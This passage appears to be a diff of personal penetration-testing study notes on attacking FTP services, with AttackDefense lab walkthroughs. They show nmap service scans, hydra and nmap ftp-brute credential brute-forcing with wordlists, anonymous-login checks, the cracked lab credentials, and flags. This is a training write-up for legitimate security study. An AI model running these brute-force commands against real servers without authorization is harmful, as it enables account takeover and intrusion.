@@ -1730,8 +1730,141 @@ use more to read content and q to get out of
 	- exit ftp server with: bye 
 	- cat file 
 	  
-	  
-	  
+
 - echo "sysadmin" > users 
 - cat users 
-- nmap ip --script ftp-brute --script-args usersb=/root/users -p 21 
+Andere om ftp te bruteforcen strategy: 
+- run folllowing command **nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 
+	- -   `--script ftp-brute`: This option specifies that the FTP-brute script should be executed. The FTP-brute script is used to perform brute-force attacks against FTP services.
+	-   `--script-args usersb=/root/users`: This option specifies the location of the username wordlist file to be used during the brute-force attack. In this case, the file is located at `/root/users`. Modify the path to the actual location of your username wordlist file.
+	-   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.
+
+
+----- LAB ----- 
+
+target ip: 192.70.37.3 
+
+
+**Questions**
+
+1.  What is the version of FTP server?
+   
+		   root@attackdefense:~# nmap 192.70.37.3 
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:08 UTC
+		Nmap scan report for target-1 (192.70.37.3)
+		Host is up (0.000010s latency).
+		Not shown: 999 closed ports
+		PORT   STATE SERVICE
+		21/tcp open  ftp    📍
+		MAC Address: 02:42:C0:46:25:03 (Unknown)
+
+
+		root@attackdefense:~# nmap 192.70.37.3 -p 21 -sV -O
+	
+		PORT   STATE SERVICE VERSION
+		21/tcp open  ftp     ProFTPD 1.3.5a 📍
+		MAC Address: 02:42:C0:46:25:03 (Unknown)
+		Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+		Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
+		No exact OS matches for host (test conditions non-ideal).
+		Network Distance: 1 hop
+		Service Info: OS: Unix
+
+or nmap -sV 
+
+   
+2.  Use the username dictionary /usr/share/metasploit framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
+   
+		   root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.70.37.3 ftp
+		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+		
+		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 13:31:20
+		[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+		[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
+		[DATA] attacking ftp://192.70.37.3:21/
+		[21][ftp] host: 192.70.37.3   login: sysadmin   password: 654321
+		[21][ftp] host: 192.70.37.3   login: rooty   password: qwerty
+		[21][ftp] host: 192.70.37.3   login: demo   password: butterfly
+		[21][ftp] host: 192.70.37.3   login: auditor   password: chocolate
+		[21][ftp] host: 192.70.37.3   login: anon   password: purple
+		[21][ftp] host: 192.70.37.3   login: administrator   password: tweety
+		[21][ftp] host: 192.70.37.3   login: diag   password: tigger
+		   
+
+
+
+3.  Find the password of user “sysadmin” using nmap script.
+   
+   
+**nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 
+
+	root@attackdefense:~# echo 'sysadmin' > users 
+	root@attackdefense:~# cat users 
+	sysadmin
+	
+
+	root@attackdefense:~# nmap 192.70.37.3 --script ftp-brute --script-args userdb=/root/users -p 21 
+	Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:38 UTC
+	Nmap scan report for target-1 (192.70.37.3)
+	Host is up (0.000054s latency).
+	
+	PORT   STATE SERVICE
+	21/tcp open  ftp
+	| ftp-brute: 
+	|   Accounts: 
+	|     sysadmin:654321 - Valid credentials
+	|_  Statistics: Performed 24 guesses in 5 seconds, average tps: 4.8
+	MAC Address: 02:42:C0:46:25:03 (Unknown)
+	   
+4.  Find seven flags hidden on the server.
+
+260ca9dd8a4577fc00b7bd5810298076   - login: sysadmin   password: 654321 
+098f6bcd4621d373cade4e832627b4f6  -  login: auditor   password: chocolate
+
+----
+
+#### FTP Anonymous login 
+
+- check open ports with nmap 
+- do service scan on open port 
+- run following command: nmap ip  -p 21 --script ftp-anon 
+	- `--script ftp-anon`: This option instructs Nmap to execute the "ftp-anon" script. The "ftp-anon" script is used to check if anonymous (unauthenticated) FTP access is allowed on the target system. 
+	- If anonymous login is possible then login with username: anonymous and no password 
+
+
+LAB -- 
+
+1.  Find the version of vsftpd server.
+   
+		   root@attackdefense:~# nmap 192.97.20.3 -sV
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:02 UTC
+		Nmap scan report for target-1 (192.97.20.3)
+		Host is up (0.0000090s latency).
+		Not shown: 999 closed ports
+		PORT   STATE SERVICE VERSION
+		21/tcp open  ftp     vsftpd 3.0.3
+		MAC Address: 02:42:C0:61:14:03 (Unknown)
+		Service Info: OS: Unix
+
+
+   
+2.  Check whether anonymous login is allowed on the ftp server using nmap script.
+   
+		   root@attackdefense:~# nmap 192.97.20.3 -p21 --script ftp-anon
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:03 UTC
+		Nmap scan report for target-1 (192.97.20.3)
+		Host is up (0.000040s latency).
+		
+		PORT   STATE SERVICE
+		21/tcp open  ftp
+		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+		| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
+		|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
+		MAC Address: 02:42:C0:61:14:03 (Unknown)
+   
+   
+   
+   
+3.  Fetch the flag from FTP server. 
+
+![[Pasted image 20230516160454.png]]
